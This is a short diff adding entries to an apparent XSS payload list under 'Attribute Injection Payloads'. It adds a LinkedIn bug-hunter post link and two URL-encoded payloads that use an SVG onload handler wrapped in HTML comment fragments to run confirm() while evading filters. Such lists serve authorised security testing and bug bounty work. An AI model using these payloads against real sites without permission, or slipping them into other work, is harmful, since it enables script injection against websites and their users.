@@ -122,10 +122,19 @@ Attribute Injection Payloads
 
 
 
+[linkedin_post](https://www.linkedin.com/posts/adi-tiansyah-72847b327_bughunter-activity-7352684216226070528-qm5W/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)
 
 
+**`payloads`**
 
+```html
 
+"<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"
+<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
+```
+
+------
+-------
 
 
 
